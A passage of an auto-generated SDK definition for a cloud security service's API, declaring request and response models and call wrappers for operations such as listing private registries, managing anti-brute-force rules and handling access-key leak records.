  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model ListPluginForUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListPluginForUuidResponseBody(name='body'),
}

async function listPluginForUuidWithOptions(tmpReq: ListPluginForUuidRequest, runtime: Util.RuntimeOptions): ListPluginForUuidResponse {
  Util.validateModel(tmpReq);
  var request = new ListPluginForUuidShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.types)) {
    request.typesShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.types, 'Types', 'simple');
  }
  var query = {};
  if (!Util.isUnset(request.typesShrink)) {
    query['Types'] = request.typesShrink;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListPluginForUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listPluginForUuid(request: ListPluginForUuidRequest): ListPluginForUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return listPluginForUuidWithOptions(request, runtime);
}

model ListPrivateRegistryListRequest {
  registryType?: string(name='RegistryType', example='harbor'),
}

model ListPrivateRegistryListResponseBody = {
  imageRegistryInfos?: [ 
    {
      aliUid?: long(name='AliUid', example='1766185894******'),
      domainName?: string(name='DomainName', example='example.com'),
      id?: long(name='Id', example='66485'),
      jenkinsEnv?: string(name='JenkinsEnv', example='JenkinsInfo'),
      netType?: long(name='NetType', example='1'),
      password?: string(name='Password', example='Harbor******'),
      persistenceDay?: long(name='PersistenceDay', example='90'),
      protocolType?: long(name='ProtocolType', example='1'),
      regionId?: string(name='RegionId', example='cn-hangzhou'),
      registryHostIp?: string(name='RegistryHostIp', example='114.55.XXX.XXX'),
      registryName?: string(name='RegistryName', example='test1'),
      registryType?: string(name='RegistryType', example='harbor'),
      registryVersion?: string(name='RegistryVersion', example='V1'),
      token?: string(name='Token', example='0da12bce-cc36-4c48-b3e6-2215fc3a****'),
      transPerHour?: int32(name='TransPerHour', example='30'),
      userName?: string(name='UserName', example='RegistryUser'),
      vpcId?: string(name='VpcId', example='vpc-bp12897gqrex01zn0****'),
      whiteList?: string(name='WhiteList', example='100.104.XXX.XXX'),
    }
  ](name='ImageRegistryInfos'),
  requestId?: string(name='RequestId', example='BE120DAB-F4E7-4C53-ADC3-A97578AB****'),
}

model ListPrivateRegistryListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListPrivateRegistryListResponseBody(name='body'),
}

async function listPrivateRegistryListWithOptions(request: ListPrivateRegistryListRequest, runtime: Util.RuntimeOptions): ListPrivateRegistryListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.registryType)) {
    query['RegistryType'] = request.registryType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListPrivateRegistryList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listPrivateRegistryList(request: ListPrivateRegistryListRequest): ListPrivateRegistryListResponse {
  var runtime = new Util.RuntimeOptions{};
  return listPrivateRegistryListWithOptions(request, runtime);
}

model ListPrivateRegistryTypeResponseBody = {
  registryTypeInfos?: [ 
    {
      count?: long(name='Count', example='2'),
      registryType?: string(name='RegistryType', example='harbor'),
    }
  ](name='RegistryTypeInfos'),
  requestId?: string(name='RequestId', example='24A20733-10A0-4AF6-BE6B-E3322413****'),
}

model ListPrivateRegistryTypeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListPrivateRegistryTypeResponseBody(name='body'),
}

async function listPrivateRegistryTypeWithOptions(runtime: Util.RuntimeOptions): ListPrivateRegistryTypeResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListPrivateRegistryType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listPrivateRegistryType(): ListPrivateRegistryTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return listPrivateRegistryTypeWithOptions(runtime);
}

model ListSystemAggregationRulesRequest {
  aggregationIds?: [ int32 ](name='AggregationIds'),
  currentPage?: int32(name='CurrentPage', example='1'),
  lang?: string(name='Lang', example='zh'),
  pageSize?: int32(name='PageSize', example='20'),
  ruleName?: string(name='RuleName'),
  ruleTypes?: [ int32 ](name='RuleTypes'),
  systemType?: int32(name='SystemType', example='0'),
}

model ListSystemAggregationRulesResponseBody = {
  aggregationList?: [ 
    {
      id?: int32(name='Id', example='1'),
      name?: string(name='Name'),
      ruleCount?: int32(name='RuleCount', example='0'),
    }
  ](name='AggregationList'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='30'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='6800B790-B10A-5C2F-BEB3-F1D5CE61****'),
}

model ListSystemAggregationRulesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListSystemAggregationRulesResponseBody(name='body'),
}

async function listSystemAggregationRulesWithOptions(request: ListSystemAggregationRulesRequest, runtime: Util.RuntimeOptions): ListSystemAggregationRulesResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListSystemAggregationRules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listSystemAggregationRules(request: ListSystemAggregationRulesRequest): ListSystemAggregationRulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listSystemAggregationRulesWithOptions(request, runtime);
}

model ListSystemClientRuleTypesResponseBody = {
  requestId?: string(name='RequestId', example='79CFF74D-E967-5407-8A78-EE03B925****'),
  ruleTypes?: [ string ](name='RuleTypes'),
}

model ListSystemClientRuleTypesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListSystemClientRuleTypesResponseBody(name='body'),
}

async function listSystemClientRuleTypesWithOptions(runtime: Util.RuntimeOptions): ListSystemClientRuleTypesResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListSystemClientRuleTypes',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listSystemClientRuleTypes(): ListSystemClientRuleTypesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listSystemClientRuleTypesWithOptions(runtime);
}

model ListSystemClientRulesRequest {
  aggregationIds?: [ int32 ](name='AggregationIds'),
  currentPage?: int32(name='CurrentPage', example='1'),
  isContainer?: int32(name='IsContainer', example='1'),
  lang?: string(name='Lang', example='zh'),
  pageSize?: int32(name='PageSize', example='20'),
  ruleName?: string(name='RuleName'),
  ruleTypes?: [ int32 ](name='RuleTypes'),
  systemType?: int32(name='SystemType', example='0'),
}

model ListSystemClientRulesResponseBody = {
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='17'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='C43CA30F-EF67-51BB-8C95-F31B8303****'),
  ruleList?: [ 
    {
      aggregationName?: string(name='AggregationName'),
      description?: string(name='Description'),
      platform?: string(name='Platform', example='linux'),
      policies?: [ 
        {
          policyKey?: string(name='PolicyKey', example='system_auto_****'),
          policyName?: string(name='PolicyName'),
        }
      ](name='Policies'),
      ruleId?: long(name='RuleId', example='30****'),
      ruleName?: string(name='RuleName'),
      ruleType?: int32(name='RuleType', example='alihips'),
      status?: int32(name='Status', example='online'),
      switchId?: string(name='SwitchId', example='USER-ENABLE-SWITCH-TYPE_****'),
    }
  ](name='RuleList'),
}

model ListSystemClientRulesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListSystemClientRulesResponseBody(name='body'),
}

async function listSystemClientRulesWithOptions(request: ListSystemClientRulesRequest, runtime: Util.RuntimeOptions): ListSystemClientRulesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aggregationIds)) {
    query['AggregationIds'] = request.aggregationIds;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.isContainer)) {
    query['IsContainer'] = request.isContainer;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.ruleName)) {
    query['RuleName'] = request.ruleName;
  }
  if (!Util.isUnset(request.ruleTypes)) {
    query['RuleTypes'] = request.ruleTypes;
  }
  if (!Util.isUnset(request.systemType)) {
    query['SystemType'] = request.systemType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListSystemClientRules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listSystemClientRules(request: ListSystemClientRulesRequest): ListSystemClientRulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listSystemClientRulesWithOptions(request, runtime);
}

model ListSystemRuleAggregationTypesRequest {
  lang?: string(name='Lang', example='zh'),
}

model ListSystemRuleAggregationTypesResponseBody = {
  aggregationTypeList?: [ 
    {
      id?: int32(name='Id', example='1'),
      name?: string(name='Name'),
    }
  ](name='AggregationTypeList'),
  requestId?: string(name='RequestId', example='1427F3BE-8A7E-57F9-BD4E-590B00D2****'),
}

model ListSystemRuleAggregationTypesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListSystemRuleAggregationTypesResponseBody(name='body'),
}

async function listSystemRuleAggregationTypesWithOptions(request: ListSystemRuleAggregationTypesRequest, runtime: Util.RuntimeOptions): ListSystemRuleAggregationTypesResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListSystemRuleAggregationTypes',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listSystemRuleAggregationTypes(request: ListSystemRuleAggregationTypesRequest): ListSystemRuleAggregationTypesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listSystemRuleAggregationTypesWithOptions(request, runtime);
}

model ListUninstallAegisMachinesRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='4'),
  os?: string(name='Os', description='The operating system of the server.

>  The value of this parameter is the value of the Values parameter that is returned by calling the [DescribeCriteria](~~DescribeCriteria~~) operation. If the value of the **Name** parameter in the response is **osType**, the value of the **Values** parameter indicates an operating system.', example='linux'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **5**.', example='5'),
  regionIdStr?: string(name='RegionIdStr', description='The region in which the server resides.

>  The value of this parameter is the value of the Values parameter that is returned by calling the [DescribeCriteria](~~DescribeCriteria~~) operation. If the value of the **Name** parameter in the response is **regionId**, the value of the **Values** parameter indicates a region ID.', example='cn-hangzhou'),
  regionNo?: string(name='RegionNo', description='The region in which the server resides.

>  The value of this parameter is the value of the Values parameter that is returned by calling the [DescribeCriteria](~~DescribeCriteria~~) operation. If the value of the **Name** parameter in the response is **regionId**, the value of the **Values** parameter indicates a region ID.', example='cn-hangzhou'),
  remark?: string(name='Remark', description='The information about the server that you want to query. The value can be the name or the public IP address of the server.', example='172.20.XX.XX'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='180.113.XX.XX'),
  vendor?: int32(name='Vendor', description='The source of the server. Valid values:

*   **0**: an asset provided by Alibaba Cloud.
*   **1**: a third-party cloud server
*   **2**: a server in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='0'),
}

model ListUninstallAegisMachinesResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  machineList?: [ 
    {
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='sas-bdrvxb4b****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='sql-test-001'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='120.79.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
      machineRegion?: string(name='MachineRegion', description='The region in which the server resides.', example='cn-hangzhou'),
      os?: string(name='Os', description='The operating system of the server. Valid values:

*   **linux**
*   **windows**
*   **windows-2003**', example='linux'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-shanghai'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='6d5b361f-958d-48a8-a9d2-d6e82c1****'),
      vendor?: int32(name='Vendor', description='The source of the server. Valid values:

*   **0**: an asset provided by Alibaba Cloud
*   **1**: a third-party cloud server
*   **2**: a server in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='0'),
      vendorName?: string(name='VendorName', description='The name of the service provider (SP) for the server.

Valid values:

*   **ALIYUN**: Alibaba Cloud
*   **OUT**: a third-party service provider
*   **IDC**: a data center
*   **TENCENT**: Tencent Cloud
*   **HUAWEICLOUD**: Huawei Cloud
*   **Microsoft**: Microsoft
*   **AWS**: Amazon Web Services (AWS)
*   **TRIPARTITE**: a lightweight server', example='ALIYUN'),
    }
  ](name='MachineList', description='An array that consists of the information about servers.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='5'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='151F6EB6-D5F3-417A-AF7B-4D84975DB586'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='44'),
}

model ListUninstallAegisMachinesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListUninstallAegisMachinesResponseBody(name='body'),
}

async function listUninstallAegisMachinesWithOptions(request: ListUninstallAegisMachinesRequest, runtime: Util.RuntimeOptions): ListUninstallAegisMachinesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.os)) {
    query['Os'] = request.os;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.regionIdStr)) {
    query['RegionIdStr'] = request.regionIdStr;
  }
  if (!Util.isUnset(request.regionNo)) {
    query['RegionNo'] = request.regionNo;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListUninstallAegisMachines',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listUninstallAegisMachines(request: ListUninstallAegisMachinesRequest): ListUninstallAegisMachinesResponse {
  var runtime = new Util.RuntimeOptions{};
  return listUninstallAegisMachinesWithOptions(request, runtime);
}

model ListUuidsByWebPathRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  pageSize?: int32(name='PageSize', example='20'),
  type?: string(name='Type', example='def'),
  webPath?: string(name='WebPath', example='/root/www****'),
}

model ListUuidsByWebPathResponseBody = {
  list?: [ 
    {
      internetIp?: string(name='InternetIp', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='172.25.XX.XX'),
      machineName?: string(name='MachineName'),
      uuid?: string(name='Uuid', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
    }
  ](name='List'),
  pageInfo?: {
    count?: int32(name='Count', example='10'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='10'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='A3C1240F-9DAC-5EE8-ADF5-2F930A95****'),
}

model ListUuidsByWebPathResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListUuidsByWebPathResponseBody(name='body'),
}

async function listUuidsByWebPathWithOptions(request: ListUuidsByWebPathRequest, runtime: Util.RuntimeOptions): ListUuidsByWebPathResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.webPath)) {
    query['WebPath'] = request.webPath;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListUuidsByWebPath',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listUuidsByWebPath(request: ListUuidsByWebPathRequest): ListUuidsByWebPathResponse {
  var runtime = new Util.RuntimeOptions{};
  return listUuidsByWebPathWithOptions(request, runtime);
}

model ListVulAutoRepairConfigRequest {
  aliasName?: string(name='AliasName'),
  currentPage?: int32(name='CurrentPage'),
  pageSize?: int32(name='PageSize'),
  type?: string(name='Type'),
}

model ListVulAutoRepairConfigResponseBody = {
  code?: string(name='Code'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
  vulAutoRepairConfigList?: [ 
    {
      aliasName?: string(name='AliasName'),
      id?: long(name='Id'),
      name?: string(name='Name'),
      reason?: string(name='Reason'),
      type?: string(name='Type'),
    }
  ](name='VulAutoRepairConfigList'),
}

model ListVulAutoRepairConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListVulAutoRepairConfigResponseBody(name='body'),
}

async function listVulAutoRepairConfigWithOptions(request: ListVulAutoRepairConfigRequest, runtime: Util.RuntimeOptions): ListVulAutoRepairConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListVulAutoRepairConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listVulAutoRepairConfig(request: ListVulAutoRepairConfigRequest): ListVulAutoRepairConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return listVulAutoRepairConfigWithOptions(request, runtime);
}

model ModifyAccessKeyLeakDealRequest {
  id?: long(name='Id'),
  idList?: [ long ](name='IdList'),
  remark?: string(name='Remark'),
  type?: string(name='Type'),
}

model ModifyAccessKeyLeakDealResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyAccessKeyLeakDealResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAccessKeyLeakDealResponseBody(name='body'),
}

async function modifyAccessKeyLeakDealWithOptions(request: ModifyAccessKeyLeakDealRequest, runtime: Util.RuntimeOptions): ModifyAccessKeyLeakDealResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.idList)) {
    query['IdList'] = request.idList;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAccessKeyLeakDeal',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyAccessKeyLeakDeal(request: ModifyAccessKeyLeakDealRequest): ModifyAccessKeyLeakDealResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAccessKeyLeakDealWithOptions(request, runtime);
}

model ModifyAntiBruteForceRuleRequest {
  defaultRule?: boolean(name='DefaultRule', description='Specifies whether to set the defense rule as the default rule. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  failCount?: int32(name='FailCount', description='The threshold of logon failures that you specify. Valid values:

*   **2**
*   **3**
*   **4**
*   **5**
*   **10**
*   **50**
*   **80**
*   **100**', example='10'),
  forbiddenTime?: int32(name='ForbiddenTime', description='The period of time during which logons from an account are not allowed. Unit: minutes. Valid values:

*   **5**
*   **15**
*   **30**
*   **60**
*   **120**
*   **360**
*   **720**
*   **1440**
*   **10080**
*   **52560000**: permanent', example='5'),
  id?: long(name='Id', description='The ID of the defense rule.', example='65778'),
  name?: string(name='Name', description='The name of the defense rule.', example='TestRule'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  span?: int32(name='Span', description='The period of time during which logon failures from an account are measured. Unit: minutes. Valid values:

*   **1**
*   **2**
*   **5**
*   **10**
*   **15**', example='1'),
  uuidList?: [ string ](name='UuidList', description='An array consisting of the UUIDs of the servers to which the defense rule is applied.', example='uuid-13213-dasda'),
}

model ModifyAntiBruteForceRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F35F45B0-5D6B-4238-BE02-A62D0760E840'),
}

model ModifyAntiBruteForceRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAntiBruteForceRuleResponseBody(name='body'),
}

async function modifyAntiBruteForceRuleWithOptions(request: ModifyAntiBruteForceRuleRequest, runtime: Util.RuntimeOptions): ModifyAntiBruteForceRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.defaultRule)) {
    query['DefaultRule'] = request.defaultRule;
  }
  if (!Util.isUnset(request.failCount)) {
    query['FailCount'] = request.failCount;
  }
  if (!Util.isUnset(request.forbiddenTime)) {
    query['ForbiddenTime'] = request.forbiddenTime;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.span)) {
    query['Span'] = request.span;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAntiBruteForceRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyAntiBruteForceRule(request: ModifyAntiBruteForceRuleRequest): ModifyAntiBruteForceRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAntiBruteForceRuleWithOptions(request, runtime);
}

model ModifyAppVulScanCycleRequest {
  cycle?: string(name='Cycle', example='1week'),
}

model ModifyAppVulScanCycleResponseBody = {
  requestId?: string(name='RequestId', example='AFEDC54D-70A2-5E56-A69B-E3D8AA8A5197'),
}

model ModifyAppVulScanCycleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAppVulScanCycleResponseBody(name='body'),
}

async function modifyAppVulScanCycleWithOptions(request: ModifyAppVulScanCycleRequest, runtime: Util.RuntimeOptions): ModifyAppVulScanCycleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.cycle)) {
    query['Cycle'] = request.cycle;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAppVulScanCycle',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyAppVulScanCycle(request: ModifyAppVulScanCycleRequest): ModifyAppVulScanCycleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAppVulScanCycleWithOptions(request, runtime);
}

model ModifyAssetGroupRequest {
  groupId?: long(name='GroupId'),
  sourceIp?: string(name='SourceIp'),
  uuids?: string(name='Uuids'),
}

model ModifyAssetGroupResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyAssetGroupResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAssetGroupResponseBody(name='body'),
}

async function modifyAssetGroupWithOptions(request: ModifyAssetGroupRequest, runtime: Util.RuntimeOptions): ModifyAssetGroupResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAssetGroup',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyAssetGroup(request: ModifyAssetGroupRequest): ModifyAssetGroupResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAssetGroupWithOptions(request, runtime);
}

model ModifyAssetImportantRequest {
  importantCode?: int32(name='ImportantCode', example='0'),
  uuidList?: string(name='UuidList', example='076a446d-df7d-424c-bdc5-bb5dc7f1****'),
}

model ModifyAssetImportantResponseBody = {
  errCode?: string(name='ErrCode', example='ServerError'),
  errMessage?: string(name='ErrMessage', example='ServerError'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  requestId?: string(name='RequestId', example='23C85959-1540-514B-93CF-2992C53A1B4F'),
  success?: boolean(name='Success', example='true'),
}

model ModifyAssetImportantResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAssetImportantResponseBody(name='body'),
}

async function modifyAssetImportantWithOptions(request: ModifyAssetImportantRequest, runtime: Util.RuntimeOptions): ModifyAssetImportantResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.importantCode)) {
    query['ImportantCode'] = request.importantCode;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyAssetImportant',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyAssetImportant(request: ModifyAssetImportantRequest): ModifyAssetImportantResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyAssetImportantWithOptions(request, runtime);
}

model ModifyAutoDelConfigRequest {
  days?: int32(name='Days'),
}

model ModifyAutoDelConfigResponseBody = {
  requestId?: string(name='RequestId'),
}

model ModifyAutoDelConfigResponse = {
  headers: map[string]string(name='headers'),
